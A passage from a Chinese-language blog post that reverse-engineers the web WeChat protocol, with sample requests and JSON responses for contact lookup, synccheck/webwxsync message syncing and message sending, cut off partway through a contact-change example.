<p>至此，登录过程完成。获取了cookie、pass_ticket和skey。</p>
<h3 id="基本信息获取">基本信息获取</h3><h4 id="webwxinit">webwxinit</h4><p>初始化整个webqq的信息获取。</p>
<p>一个POST请求（sorry，我忘记和上文的passticket啊uin啊对应一致了。</p>
<pre><code><span class="string">https:</span><span class="comment">//wx.qq.com/cgi-bin/mmwebwx-bin/webwxinit?r=-1163944362&amp;lang=en_US&amp;pass_ticket=KlRMZmPcELxJHikrTsq6UEuDiy%252BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI</span>
</code></pre><p>post payload</p>
<pre><code>{"<span class="attribute">BaseRequest</span>":<span class="value">{"<span class="attribute">Uin</span>":<span class="value"><span class="string">"2684027137"</span></span>,"<span class="attribute">Sid</span>":<span class="value"><span class="string">"L9W0ddcaijmzhYhu"</span></span>,"<span class="attribute">Skey</span>":<span class="value"><span class="string">"@crypt_3bb2969_5d9682fbe6794c9437337ef278f6615c"</span></span>,"<span class="attribute">DeviceID</span>":<span class="value"><span class="string">"e159973572418266"</span></span>}</span>}
</code></pre><p>返回一个巨大的json，包含页面首次更新所需的基本信息</p>
<ul>
<li>BaseResponse： 标识返回是否出错</li>
<li>Count：登录时显示的常用联系人列表中条目个数</li>
<li>ContactList：常用联系人列表(包括特殊联系人、群和私信)</li>
<li>SyncKey：更新Key，不太清楚是啥，似乎类似activesync的一种协议</li>
<li>User: 自己的信息，用户uin，Username，NickName，HeadImgUrl等</li>
<li>ClientVersion</li>
<li>SystemTime</li>
<li>GrayScale: 不知什么</li>
<li>InviteStartCount: 不知什么</li>
<li>MPSubscribeMsgCount： 这两条是有关web微信中间一栏阅读列表的</li>
<li>MPSubscribeMsgList: 同上</li>
<li>ClickReportInterval：点击报告间隔，似乎只是为了报告些性能信息<a href="">https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxstatreport?fun=new</a></li>
</ul>
<p>这个请求会在ContactList里获得常用联系人信息，接着web微信会使用这些信息来batchgetcontact获取详细群组或者个人信息（详见下文）。并且，最最关键的是Synckey，用这个key来不断跟踪web微信客户端的变化。</p>
<h4 id="webwxgetcontact">webwxgetcontact</h4><p>获取联系人列表的GET请求。</p>
<pre><code>https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetcontact?lang=en_US&amp;pass_ticket=KlRMZmPcELxJHikrTsq6UEuDiy%252BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI&amp;r=<span class="number">1452862903198</span>&amp;seq=0&amp;skey=@crypt_3bb<span class="number">2969_5d96</span>82fbe<span class="number">6794c94373</span>37ef<span class="number">278f6615</span>c
</code></pre><p>返回包含联系人信息列表的JSON数据</p>
<ul>
<li>BaseResponse</li>
<li>MemberCount</li>
<li>MemberList</li>
<li>Seq： 只见过返回0</li>
</ul>
<h4 id="batchgetcontact">batchgetcontact</h4><p>这是获取用户信息最重要的请求。POST请求：</p>
<pre><code>http<span class="variable">s:</span>//wx.qq.<span class="keyword">com</span>/cgi-bin/mmwebwx-bin/webwxbatchgetcontact?<span class="built_in">type</span>=<span class="keyword">ex</span>&amp;<span class="keyword">r</span>=<span class="number">1453373586582</span>&amp;pass_ticket=cNQtWm5HAlkezd4WDrmrb6TBQYtkdHM4jaqbSWWYCT0EzIWzxBLHTu6Rb4fPw%<span class="number">252</span>Fhf
</code></pre><p><code>type=ex</code>硬编码不知道想表达什么，r是时间戳。</p>
<p>post data有两种，分别对应针对用户和群的查询：</p>
<pre><code>// UserName是要查询具体信息的用户名，EncryChatRoomId是该用户所属的群用户名。不知道为什么web微信要这么设计
{<span class="string">"BaseRequest"</span>:{<span class="string">"Uin"</span>:<span class="number">2684027137</span>,<span class="string">"Sid"</span>:<span class="string">"rnggO94JNo8B3Irp"</span>,<span class="string">"Skey"</span>:<span class="string">"@crypt_3bb2969_890811a1e096f98662389b04dac3dcb8"</span>,<span class="string">"DeviceID"</span>:<span class="string">"e559659465724952"</span>},<span class="string">"Count"</span>:<span class="number">1</span>,<span class="string">"List"</span>:[{<span class="string">"UserName"</span>:<span class="string">"@83cdf89d8ae7bf82d1fba26693b4952f"</span>,<span class="string">"EncryChatRoomId"</span>:<span class="string">"@@8432d9b1c96038e5229185af62caa626add1a6b87554eb91cc5f5b63a207c8b3"</span>}]}
{<span class="string">"BaseRequest"</span>:{<span class="string">"Uin"</span>:<span class="number">2684027137</span>,<span class="string">"Sid"</span>:<span class="string">"rnggO94JNo8B3Irp"</span>,<span class="string">"Skey"</span>:<span class="string">"@crypt_3bb2969_890811a1e096f98662389b04dac3dcb8"</span>,<span class="string">"DeviceID"</span>:<span class="string">"e559659465724952"</span>},<span class="string">"Count"</span>:<span class="number">1</span>,<span class="string">"List"</span>:[{<span class="string">"UserName"</span>:<span class="string">"@83cdf89d8ae7bf82d1fba26693b4952f"</span>,<span class="string">"EncryChatRoomId"</span>:<span class="string">"@@8432d9b1c96038e5229185af62caa626add1a6b87554eb91cc5f5b63a207c8b3"</span>}]}

// UserName是想要查询具体信息的群UserName
{<span class="string">"BaseRequest"</span>:{<span class="string">"Uin"</span>:<span class="number">2684027137</span>,<span class="string">"Sid"</span>:<span class="string">"L9W0ddcaijmzhYhu"</span>,<span class="string">"Skey"</span>:<span class="string">"@crypt_3bb2969_5d9682fbe6794c9437337ef278f6615c"</span>,<span class="string">"DeviceID"</span>:<span class="string">"e017670883684764"</span>},<span class="string">"Count"</span>:<span class="number">2</span>,<span class="string">"List"</span>:[{<span class="string">"UserName"</span>:<span class="string">"@@9dc894837da0c2ac9932a85afb91af2d085807013562857e8b4a0ca66661ec68"</span>,<span class="string">"EncryChatRoomId"</span>:<span class="string">""</span>},{<span class="string">"UserName"</span>:<span class="string">"@@69dfa612d6bbefebbf24c323b6103680ac32c6a7b41e0862cc24f0b6f3174a08"</span>,<span class="string">"EncryChatRoomId"</span>:<span class="string">""</span>}]}
</code></pre><p>返回典型User集合如下，上文提及的getcontact和batchgetcontact得到的都是这样：</p>
<pre><code>{
"<span class="attribute">Uin</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">UserName</span>": <span class="value"><span class="string">"filehelper"</span></span>,
"<span class="attribute">NickName</span>": <span class="value"><span class="string">"文件传输助手"</span></span>,
"<span class="attribute">HeadImgUrl</span>": <span class="value"><span class="string">"/cgi-bin/mmwebwx-bin/webwxgeticon?seq=620730115&amp;username=filehelper&amp;skey=@crypt_3bb2969_2e9301eaab7a4b13a3a893a0bb5e8dfb"</span></span>,
"<span class="attribute">ContactFlag</span>": <span class="value"><span class="number">3</span></span>,
"<span class="attribute">MemberCount</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">MemberList</span>": <span class="value">[]</span>,
"<span class="attribute">RemarkName</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">HideInputBarFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Sex</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Signature</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">VerifyFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">OwnerUin</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">PYInitial</span>": <span class="value"><span class="string">"WJCSZS"</span></span>,
"<span class="attribute">PYQuanPin</span>": <span class="value"><span class="string">"wenjianchuanshuzhushou"</span></span>,
"<span class="attribute">RemarkPYInitial</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">RemarkPYQuanPin</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">StarFriend</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">AppAccountFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Statues</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">AttrStatus</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Province</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">City</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">Alias</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">SnsFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">UniFriend</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">DisplayName</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">ChatRoomId</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">KeyWord</span>": <span class="value"><span class="string">"fil"</span></span>,
"<span class="attribute">EncryChatRoomId</span>": <span class="value"><span class="string">""</span>
</span>}
</code></pre><p>典型群信息集合</p>
<pre><code>{
"<span class="attribute">Uin</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">UserName</span>": <span class="value"><span class="string">"@@3376dc306923e39c2c5c43915012b1157af80fdc21f1cfb703ee720d09e13315"</span></span>,
"<span class="attribute">NickName</span>": <span class="value"><span class="string">"BJ NodeJS Club"</span></span>,
"<span class="attribute">HeadImgUrl</span>": <span class="value"><span class="string">"/cgi-bin/mmwebwx-bin/webwxgetheadimg?seq=639556586&amp;username=@@3376dc306923e39c2c5c43915012b1157af80fdc21f1cfb703ee720d09e13315&amp;skey="</span></span>,
"<span class="attribute">ContactFlag</span>": <span class="value"><span class="number">3</span></span>,
"<span class="attribute">MemberCount</span>": <span class="value"><span class="number">421</span></span>,
"<span class="attribute">MemberList</span>": <span class="value">[{
  "<span class="attribute">Uin</span>": <span class="value"><span class="number">0</span></span>,
  "<span class="attribute">UserName</span>": <span class="value"><span class="string">"@eb59926a7755e31f3030a883845eb647"</span></span>,
  "<span class="attribute">NickName</span>": <span class="value"><span class="string">"hain"</span></span>,
  "<span class="attribute">AttrStatus</span>": <span class="value"><span class="number">98407</span></span>,
  "<span class="attribute">PYInitial</span>": <span class="value"><span class="string">""</span></span>,
  "<span class="attribute">PYQuanPin</span>": <span class="value"><span class="string">""</span></span>,
  "<span class="attribute">RemarkPYInitial</span>": <span class="value"><span class="string">""</span></span>,
  "<span class="attribute">RemarkPYQuanPin</span>": <span class="value"><span class="string">""</span></span>,
  "<span class="attribute">MemberStatus</span>": <span class="value"><span class="number">0</span></span>,
  "<span class="attribute">DisplayName</span>": <span class="value"><span class="string">""</span></span>,
  "<span class="attribute">KeyWord</span>": <span class="value"><span class="string">"hai"</span>
  </span>}
...// 省略若干Member
]</span>,
"<span class="attribute">RemarkName</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">HideInputBarFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Sex</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Signature</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">VerifyFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">OwnerUin</span>": <span class="value"><span class="number">246642915</span></span>,
"<span class="attribute">PYInitial</span>": <span class="value"><span class="string">"BJNODEJSCLUB"</span></span>,
"<span class="attribute">PYQuanPin</span>": <span class="value"><span class="string">"BJNodeJSClub"</span></span>,
"<span class="attribute">RemarkPYInitial</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">RemarkPYQuanPin</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">StarFriend</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">AppAccountFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Statues</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">AttrStatus</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">Province</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">City</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">Alias</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">SnsFlag</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">UniFriend</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">DisplayName</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">ChatRoomId</span>": <span class="value"><span class="number">0</span></span>,
"<span class="attribute">KeyWord</span>": <span class="value"><span class="string">""</span></span>,
"<span class="attribute">EncryChatRoomId</span>": <span class="value"><span class="string">"@9d9762417362d83c838bb54afacdac14"</span>
</span>}
</code></pre><p>比较有意思的是，这里群信息中的EncryChatRoomId只用来请求头像图片（参见下文），而请求中的EncryChatRoomId的值却填写的是群的UserName。</p>
<h4 id="webwxgeticon和webwxgetheadimg">webwxgeticon和webwxgetheadimg</h4><p>用户头像获取，每个User有个对应的HeadImgUrl。都不太一样</p>
<pre><code>// 带skey用户
https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgeticon?seq=<span class="number">620730145</span>&amp;username=@63f002cacb7eebc558206af<span class="number">36c8758e68</span><span class="number">374063d65</span><span class="number">3e51181</span>eeb<span class="number">41a19a72339</span>9&amp;skey=@crypt_3bb<span class="number">2969_89081</span><span class="number">1a1e096</span>f<span class="number">98662389b04</span>dac3dcb8
// skey为空的群图像，用户有时也有这种请求，不明确为何。ps: 用户信息中的HeadImgUrl也不会带skey。
https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetheadimg?seq=<span class="number">639547833</span>&amp;username=@@<span class="number">8432d9b1</span>c<span class="number">96038e52291</span>85af62caa626add<span class="number">1a6b87554</span>eb91cc<span class="number">5f5b63a207</span>c8b3&amp;skey=
// 带chatroomid的非好友群中用户头像， 其中chatroomid是群信息中的encrychatroomid。
https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgeticon?seq=0&amp;username=@<span class="number">81c029b96</span>b211aed1f4da9ea8a2acea7&amp;skey=@crypt_3bb<span class="number">2969_89081</span><span class="number">1a1e096</span>f<span class="number">98662389b04</span>dac3dcb8&amp;chatroomid=@<span class="number">1d5974437</span>ca911fe<span class="number">1315d415</span>d98645ed
</code></pre><p>似乎第一次请求会带上有值的skey，之后就不一定了不确定。</p>
<h3 id="信息收发">信息收发</h3><h4 id="syncheck与webwxsync(长连接和消息更新)">syncheck与webwxsync(长连接和消息更新)</h4><p>基本信息获取完毕，接下来一个长GET连接，服务器可能会保持连接很久才返回，一旦断开客户断继续立即连接。这样服务器可以随时将更新的消息推送到客户端。</p>
<pre><code>https://webpush.weixin.qq.com/cgi-bin/mmwebwx-bin/synccheck?r=<span class="number">1452862903206</span>&amp;skey=%40crypt_3bb<span class="number">2969_5d96</span>82fbe<span class="number">6794c94373</span>37ef<span class="number">278f6615</span>c&amp;sid=L9W0ddcaijmzhYhu&amp;uin=<span class="number">2684027137</span>&amp;deviceid=e<span class="number">88171850929</span>3654&amp;synckey=<span class="number">1_63954575</span><span class="number">8%7C2_63</span><span class="number">9547230%7</span>C<span class="number">3_63954668</span><span class="number">1%7C1000</span>_<span class="number">1452852659</span>&amp;_=<span class="number">1452862890152</span>
</code></pre><p>一个典型的返回为</p>
<pre><code>window.synccheck={<span class="string">retcode:</span><span class="string">"0"</span>,<span class="string">selector:</span><span class="string">"2"</span>}
</code></pre><p>分析<a href="https://res.wx.qq.com/zh_CN/htmledition/v2/js/webwxApp2aeaf2.js" target="_blank" rel="external">webwx源码</a>可以看到，如果retcode不是0且selector不为0，则发出这么一个POST请求</p>
<pre><code>https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxsync?sid=L9W0ddcaijmzhYhu&amp;skey=@crypt_3bb<span class="number">2969_5d96</span>82fbe<span class="number">6794c94373</span>37ef<span class="number">278f6615</span>c&amp;lang=en_US&amp;pass_ticket=KlRMZmPcELxJHikrTsq6UEuDiy%252BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI
</code></pre><p>请求载荷为</p>
<pre><code>{"<span class="attribute">BaseRequest</span>":<span class="value">{"<span class="attribute">Uin</span>":<span class="value"><span class="number">2684027137</span></span>,"<span class="attribute">Sid</span>":<span class="value"><span class="string">"L9W0ddcaijmzhYhu"</span></span>,"<span class="attribute">Skey</span>":<span class="value"><span class="string">"@crypt_3bb2969_5d9682fbe6794c9437337ef278f6615c"</span></span>,"<span class="attribute">DeviceID</span>":<span class="value"><span class="string">"e431325091638023"</span></span>}</span>,"<span class="attribute">SyncKey</span>":<span class="value">{"<span class="attribute">Count</span>":<span class="value"><span class="number">4</span></span>,"<span class="attribute">List</span>":<span class="value">[{"<span class="attribute">Key</span>":<span class="value"><span class="number">1</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639545758</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">2</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639547230</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">3</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639546681</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">1000</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">1452852659</span></span>}]</span>}</span>,"<span class="attribute">rr</span>":<span class="value">-<span class="number">1163958067</span></span>}
</code></pre><p>其中rr为<code>~Date.now()</code>。这里第一次传递的是webwxinit时得到的SyncKey。一般开始有四个键值对，不知道对应什么意义。</p>
<p>返回为一个JSON对象，几个比较重要的属性包含</p>
<ul>
<li>BaseResponse</li>
<li>AddMsgCount:新增消息数</li>
<li>AddMsgList：新增消息列表</li>
<li>ModContactCount: 变更联系人数目</li>
<li>ModContactList: 变更联系人列表</li>
<li>SyncKey:新的synckey列表</li>
</ul>
<p>接下来，又一个syncheck请求要向服务器表示上面的webwxsync响应已经收到了，更新SyncKey。</p>
<pre><code>https://webpush.weixin.qq.com/cgi-bin/mmwebwx-bin/synccheck?r=<span class="number">145286290698</span>6&amp;skey=%40crypt_3bb<span class="number">2969_5d96</span>82fbe<span class="number">6794c94373</span>37ef<span class="number">278f6615</span>c&amp;sid=L9W0ddcaijmzhYhu&amp;uin=<span class="number">2684027137</span>&amp;deviceid=e<span class="number">39032063125</span>8365&amp;synckey=<span class="number">1_63954575</span><span class="number">8%7C2_63</span><span class="number">9547231%7</span>C<span class="number">3_63954668</span><span class="number">1%7C11_63</span><span class="number">9547225%7</span>C<span class="number">13_639540102</span>%<span class="number">7C203_145286</span><span class="number">2598%7C100</span><span class="number">0_145285265</span>9&amp;_=<span class="number">1452862890153</span>
</code></pre><p>若synccheck返回为（我没从源码中看出selector的意义）。</p>
<pre><code>window.synccheck={<span class="string">retcode:</span><span class="string">"0"</span>,<span class="string">selector:</span><span class="string">"0"</span>}
</code></pre><p>则继续发出相同请求</p>
<p>若返回不为以上返回值，继续POST请求webwxsync</p>
<pre><code>https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxsync?sid=L9W0ddcaijmzhYhu&amp;skey=@crypt_3bb<span class="number">2969_5d96</span>82fbe<span class="number">6794c94373</span>37ef<span class="number">278f6615</span>c&amp;lang=en_US&amp;pass_ticket=KlRMZmPcELxJHikrTsq6UEuDiy%252BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI
</code></pre><p>请求参数如下</p>
<pre><code>{"<span class="attribute">BaseRequest</span>":<span class="value">{"<span class="attribute">Uin</span>":<span class="value"><span class="number">2684027137</span></span>,"<span class="attribute">Sid</span>":<span class="value"><span class="string">"L9W0ddcaijmzhYhu"</span></span>,"<span class="attribute">Skey</span>":<span class="value"><span class="string">"@crypt_3bb2969_5d9682fbe6794c9437337ef278f6615c"</span></span>,"<span class="attribute">DeviceID</span>":<span class="value"><span class="string">"e544554467912584"</span></span>}</span>,"<span class="attribute">SyncKey</span>":<span class="value">{"<span class="attribute">Count</span>":<span class="value"><span class="number">7</span></span>,"<span class="attribute">List</span>":<span class="value">[{"<span class="attribute">Key</span>":<span class="value"><span class="number">1</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639545758</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">2</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639547231</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">3</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639546681</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">11</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639547232</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">13</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">639540102</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">203</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">1452862989</span></span>},{"<span class="attribute">Key</span>":<span class="value"><span class="number">1000</span></span>,"<span class="attribute">Val</span>":<span class="value"><span class="number">1452852659</span></span>}]</span>}</span>,"<span class="attribute">rr</span>":<span class="value">-<span class="number">1164083935</span></span>}
</code></pre><p>这时候使用的syncKey是上次webwxsync时返回的新synckey</p>
<p>该过程循环往复，每次都伴随着SyncKey的不断更新。通过这个机制web微信实现信息的增量更新同步。</p>
<h4 id="消息发送">消息发送</h4><p>一个POST请求</p>
<pre><code><span class="string">https:</span><span class="comment">//wx.qq.com/cgi-bin/mmwebwx-bin/webwxsendmsg?lang=en_US&amp;pass_ticket=KlRMZmPcELxJHikrTsq6UEuDiy%252BZn1wFQ1VoeVAHUls82tXXB4L89ePbSghP6ICI</span>
</code></pre><p>请求载荷为</p>
<pre><code>{"<span class="attribute">BaseRequest</span>":<span class="value">{"<span class="attribute">Uin</span>":<span class="value"><span class="number">2684027137</span></span>,"<span class="attribute">Sid</span>":<span class="value"><span class="string">"L9W0ddcaijmzhYhu"</span></span>,"<span class="attribute">Skey</span>":<span class="value"><span class="string">"@crypt_3bb2969_5d9682fbe6794c9437337ef278f6615c"</span></span>,"<span class="attribute">DeviceID</span>":<span class="value"><span class="string">"e888644980385645"</span></span>}</span>,"<span class="attribute">Msg</span>":<span class="value">{"<span class="attribute">Type</span>":<span class="value"><span class="number">1</span></span>,"<span class="attribute">Content</span>":<span class="value"><span class="string">"养鸡厂233\n"</span></span>,"<span class="attribute">FromUserName</span>":<span class="value"><span class="string">"@30a777fdcc5ed46bbbf7bc695515afba9ad194cc720e006e6bb775054102636f"</span></span>,"<span class="attribute">ToUserName</span>":<span class="value"><span class="string">"@@48967eff39f174a33012bde5af8878227dd4ba8f64dd5ecf7a6495d5b979e6ac"</span></span>,"<span class="attribute">LocalID</span>":<span class="value"><span class="string">"14528638294750795"</span></span>,"<span class="attribute">ClientMsgId</span>":<span class="value"><span class="string">"14528638294750795"</span></span>}</span>}
</code></pre><p>其中type标识了发送消息的类型，1表示文本消息。另从源码中看到， LocalID和ClientMsgId这样计算</p>
<pre><code>(Date.<span class="function"><span class="title">now</span><span class="params">()</span></span> + Math.<span class="function"><span class="title">random</span><span class="params">()</span></span>.<span class="function"><span class="title">toFixed</span><span class="params">(<span class="number">3</span>)</span></span>).<span class="function"><span class="title">replace</span><span class="params">(<span class="string">'.'</span>, <span class="string">''</span>)</span></span>
</code></pre><p>该请求返回一个JSON对象</p>
<ul>
<li>BaseResponse</li>
<li>MsgID: 服务器返回消息id  // 微信公众平台文档中也提到可以用来排序或排重好像。</li>
<li>LocalID: 发送时指定的本地id.</li>
</ul>
<h4 id="消息接收实例">消息接收实例</h4><p>一个典型收到文本信息的例子：</p>
<pre><code><span class="string">"AddMsgCount"</span>: <span class="number">2</span>,
<span class="string">"AddMsgList"</span>: [{
    <span class="string">"MsgId"</span>: <span class="string">"6276659661087965644"</span>,
    <span class="string">"FromUserName"</span>: <span class="string">"@@cd020d3254fa869dfdc88a2ef4e4e201384b909eeabcb3724463bf64c5f7a452"</span>,
    <span class="string">"ToUserName"</span>: <span class="string">"@31908794c3035a00b386bc9ef0526ee8d95b3c426d53fb4f9466b67d7a0b5fef"</span>,
    <span class="string">"MsgType"</span>: <span class="number">1</span>,
    <span class="string">"Content"</span>: <span class="string">"@f88c48e531bc7de94072a206729750ff:&lt;br/&gt;好了，收工，你们聊"</span>,
    <span class="string">"Status"</span>: <span class="number">3</span>,
    <span class="string">"ImgStatus"</span>: <span class="number">1</span>,
    <span class="string">"CreateTime"</span>: <span class="number">1453391337</span>,
    <span class="string">"VoiceLength"</span>: <span class="number">0</span>,
    <span class="string">"PlayLength"</span>: <span class="number">0</span>,
    <span class="string">"FileName"</span>: <span class="string">""</span>,
    <span class="string">"FileSize"</span>: <span class="string">""</span>,
    <span class="string">"MediaId"</span>: <span class="string">""</span>,
    <span class="string">"Url"</span>: <span class="string">""</span>,
    <span class="string">"AppMsgType"</span>: <span class="number">0</span>,
    <span class="string">"StatusNotifyCode"</span>: <span class="number">0</span>,
    <span class="string">"StatusNotifyUserName"</span>: <span class="string">""</span>,
    <span class="string">"RecommendInfo"</span>: {
      <span class="string">"UserName"</span>: <span class="string">""</span>,
      <span class="string">"NickName"</span>: <span class="string">""</span>,
      <span class="string">"QQNum"</span>: <span class="number">0</span>,
      <span class="string">"Province"</span>: <span class="string">""</span>,
      <span class="string">"City"</span>: <span class="string">""</span>,
      <span class="string">"Content"</span>: <span class="string">""</span>,
      <span class="string">"Signature"</span>: <span class="string">""</span>,
      <span class="string">"Alias"</span>: <span class="string">""</span>,
      <span class="string">"Scene"</span>: <span class="number">0</span>,
      <span class="string">"VerifyFlag"</span>: <span class="number">0</span>,
      <span class="string">"AttrStatus"</span>: <span class="number">0</span>,
      <span class="string">"Sex"</span>: <span class="number">0</span>,
      <span class="string">"Ticket"</span>: <span class="string">""</span>,
      <span class="string">"OpCode"</span>: <span class="number">0</span>
      }
    ,
    <span class="string">"ForwardFlag"</span>: <span class="number">0</span>,
    <span class="string">"AppInfo"</span>: {
      <span class="string">"AppID"</span>: <span class="string">""</span>,
      <span class="string">"Type"</span>: <span class="number">0</span>
      }
    ,
    <span class="string">"HasProductId"</span>: <span class="number">0</span>,
    <span class="string">"Ticket"</span>: <span class="string">""</span>,
    <span class="string">"ImgHeight"</span>: <span class="number">0</span>,
    <span class="string">"ImgWidth"</span>: <span class="number">0</span>,
    <span class="string">"SubMsgType"</span>: <span class="number">0</span>,
    <span class="string">"NewMsgId"</span>: <span class="number">6276659661087965644</span>
  }
  ,{
    <span class="string">"MsgId"</span>: <span class="string">"1010502497825347915"</span>,
    <span class="string">"FromUserName"</span>: <span class="string">"@c1019d5180ee2ef97a302737205b788502476a24cb1e870ac99da1aad788ac5f"</span>,
    <span class="string">"ToUserName"</span>: <span class="string">"@31908794c3035a00b386bc9ef0526ee8d95b3c426d53fb4f9466b67d7a0b5fef"</span>,
    <span class="string">"MsgType"</span>: <span class="number">1</span>,
    <span class="string">"Content"</span>: <span class="string">"牛逼哄哄的啊！"</span>,
    <span class="string">"Status"</span>: <span class="number">3</span>,
    <span class="string">"ImgStatus"</span>: <span class="number">1</span>,
    <span class="string">"CreateTime"</span>: <span class="number">1453391337</span>,
    <span class="string">"VoiceLength"</span>: <span class="number">0</span>,
    <span class="string">"PlayLength"</span>: <span class="number">0</span>,
    <span class="string">"FileName"</span>: <span class="string">""</span>,
    <span class="string">"FileSize"</span>: <span class="string">""</span>,
    <span class="string">"MediaId"</span>: <span class="string">""</span>,
    <span class="string">"Url"</span>: <span class="string">""</span>,
    <span class="string">"AppMsgType"</span>: <span class="number">0</span>,
    <span class="string">"StatusNotifyCode"</span>: <span class="number">0</span>,
    <span class="string">"StatusNotifyUserName"</span>: <span class="string">""</span>,
    <span class="string">"RecommendInfo"</span>: {
      <span class="string">"UserName"</span>: <span class="string">""</span>,
      <span class="string">"NickName"</span>: <span class="string">""</span>,
      <span class="string">"QQNum"</span>: <span class="number">0</span>,
      <span class="string">"Province"</span>: <span class="string">""</span>,
      <span class="string">"City"</span>: <span class="string">""</span>,
      <span class="string">"Content"</span>: <span class="string">""</span>,
      <span class="string">"Signature"</span>: <span class="string">""</span>,
      <span class="string">"Alias"</span>: <span class="string">""</span>,
      <span class="string">"Scene"</span>: <span class="number">0</span>,
      <span class="string">"VerifyFlag"</span>: <span class="number">0</span>,
      <span class="string">"AttrStatus"</span>: <span class="number">0</span>,
      <span class="string">"Sex"</span>: <span class="number">0</span>,
      <span class="string">"Ticket"</span>: <span class="string">""</span>,
      <span class="string">"OpCode"</span>: <span class="number">0</span>
      }
    ,
    <span class="string">"ForwardFlag"</span>: <span class="number">0</span>,
    <span class="string">"AppInfo"</span>: {
      <span class="string">"AppID"</span>: <span class="string">""</span>,
      <span class="string">"Type"</span>: <span class="number">0</span>
      }
    ,
    <span class="string">"HasProductId"</span>: <span class="number">0</span>,
    <span class="string">"Ticket"</span>: <span class="string">""</span>,
    <span class="string">"ImgHeight"</span>: <span class="number">0</span>,
    <span class="string">"ImgWidth"</span>: <span class="number">0</span>,
    <span class="string">"SubMsgType"</span>: <span class="number">0</span>,
    <span class="string">"NewMsgId"</span>: <span class="number">1010502497825347915</span>
  }
],
</code></pre><p>这个例子中，可以看到群信息中包含</p>
<pre><code><span class="string">"Content"</span>: <span class="string">"<span class="variable">@f88c48e531bc7de94072a206729750ff</span>:&lt;br/&gt;好了，收工，你们聊"</span>,
</code></pre><p>这样的内容，而这个<br>前面的部分，实际上在微信中是标识群中发言人的UserName。因此，展示或者记录的时候需要先解析UserName到NickName或者DisplayName。这个过程Web微信通过getcontact、batchgetcontact两类请求请求数据，并且缓存起来。</p>
<p>ModContactList中则包含变更的联系人信息，一个典型例子</p>
<pre><code><span class="string">"ModContactCount"</span>: <span class="number">1</span>,
<span class="string">"ModContactList"</span>: [{
  <span class="string">"UserName"</span>: <span class="string">"@@a6dd369b835a7f6a3fc8d4f0ace3b2de80c9c097f0439955043e6b716eb007fb"</span>,
  <span class="string">"NickName"</span>: <span class="string">""</span>,
  <span class="string">"Sex"</span>: <span class="number">0</span>,
  <span class="string">"HeadImgUpdateFlag"</span>: <span class="number">1</span>,
  <span class="string">"ContactType"</span>: <span class="number">0</span>,
  <span class="string">"Alias"</span>: <span class="string">""</span>,
